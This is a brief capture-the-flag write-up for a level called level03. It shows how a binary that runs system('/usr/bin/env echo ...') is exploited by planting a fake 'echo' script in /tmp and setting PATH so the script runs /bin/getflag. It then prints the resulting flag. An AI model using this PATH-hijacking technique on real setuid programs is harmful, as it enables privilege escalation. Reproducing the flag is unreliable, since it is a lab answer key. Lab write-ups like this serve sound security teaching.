In our home direcotry, we can find the binary 'level03'. If we decompile or debug it, we can see that the 'system' LIBC function is called with the the string '/usr/bin/env echo Exploit me' (gdb: x/s 0x80485e0). So to exploit this binary, we can change our 'PATH' environment and call this following script with the same name 'echo' to use it instead the real one:

cat > /tmp/echo << EOF
#!/bin/bash
/bin/getflag
EOF
chmod 777 /tmp/echo
env PATH=/tmp /home/user/level03/level03

We get the flag "qi0maab88jeaj46qoumi7maus".